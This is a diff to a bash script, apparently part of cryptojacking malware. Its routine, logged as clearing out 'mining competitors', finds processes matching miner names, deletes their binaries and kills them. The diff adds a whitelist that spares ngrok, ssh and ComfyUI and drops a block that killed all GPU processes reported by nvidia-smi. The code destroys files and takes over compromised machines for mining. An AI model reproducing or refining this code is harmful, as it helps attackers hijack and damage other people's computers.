@@ -53,34 +53,35 @@ log_event() {
 cleanup_miner_processes() {
     echo "chistka konkurentov majninga..." | tee -a "$LOGFILE"
     local patterns="CaifUi|miner|xmrig|lolMiner|crypto|eth|xmr"
+    local whitelist="ngrok|ssh|screen|bash|zsh|tmux|python|python3|Comfy|ComfyUI|cryptex"
     local cleared=0
     if $IS_ROOT; then
-        ps aux | grep -Ei "$patterns" | grep -v grep | awk '{print $2}' | while read -r pid; do
+        ps aux | grep -Ei "$patterns" | grep -v grep | while read -r line; do
+            pname=$(echo "$line" | awk '{print $11}')
+            # если попал в whitelist — не трогаем
+            if echo "$pname" | grep -Eiq "$whitelist"; then
+                continue
+            fi
+            pid=$(echo "$line" | awk '{print $2}')
             exe="/proc/$pid/exe"
             if [ -L "$exe" ]; then
                 real_bin=$(ls -l "$exe" 2>/dev/null | awk '{print $NF}')
                 [[ -f "$real_bin" ]] && rm -f "$real_bin" && log_event "udalil binarnik $real_bin"
             fi
-            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid" && cleared=$((cleared+1))
+            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid ($pname)" && cleared=$((cleared+1))
         done
     else
-        ps -u $USER -o pid,comm | grep -Ei "$patterns" | awk '{print $1}' | while read -r pid; do
+        ps -u $USER -o pid,comm | grep -Ei "$patterns" | while read -r pid pname; do
+            # если попал в whitelist — не трогаем
+            if echo "$pname" | grep -Eiq "$whitelist"; then
+                continue
+            fi
             exe="/proc/$pid/exe"
             if [ -L "$exe" ]; then
                 bin=$(ls -l "$exe" 2>/dev/null | awk '{print $NF}')
                 [[ -f "$bin" ]] && rm -f "$bin" && log_event "udalil binarnik $bin"
             fi
-            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid" && cleared=$((cleared+1))
-        done
-    fi
-    if command -v nvidia-smi >/dev/null 2>&1; then
-        nvidia-smi pmon -c 1 | awk 'NR>1 {print $2}' | grep -E '[0-9]+' | while read -r npid; do
-            exe="/proc/$npid/exe"
-            if [ -L "$exe" ]; then
-                nbin=$(ls -l "$exe" 2>/dev/null | awk '{print $NF}')
-                [[ -f "$nbin" ]] && rm -f "$nbin" && log_event "(nvidia) udalil binarnik $nbin"
-            fi
-            kill -9 "$npid" 2>/dev/null && log_event "(nvidia) ubil process $npid" && cleared=$((cleared+1))
+            kill -9 "$pid" 2>/dev/null && log_event "ubil process $pid ($pname)" && cleared=$((cleared+1))
         done
     fi
     log_event "ochishcheno processov: $cleared"
